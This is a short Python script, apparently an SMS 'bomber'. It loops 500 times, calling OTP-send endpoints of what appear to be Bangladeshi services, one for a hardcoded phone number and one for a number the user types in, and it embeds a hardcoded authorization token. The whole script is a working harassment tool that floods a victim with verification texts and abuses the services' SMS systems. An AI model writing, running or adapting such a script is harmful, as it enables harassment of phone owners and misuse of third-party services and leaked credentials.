import requests, json
number=input("Number; ")
url = "http://45.114.85.19:8080/v3/otp/send?msisdn=8801862315904"
url1 = "https://prodapi.swap.com.bd/api/v1/send-otp/login?mobile_number=88"+number+"&referral=false"
headers4 = {"x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3","Content-Type":"application/json"}
for i in range(500):
    r=requests.get(url)
    x=requests.post(url1,headers=headers4)
    print(i+1,r.text,x.text)
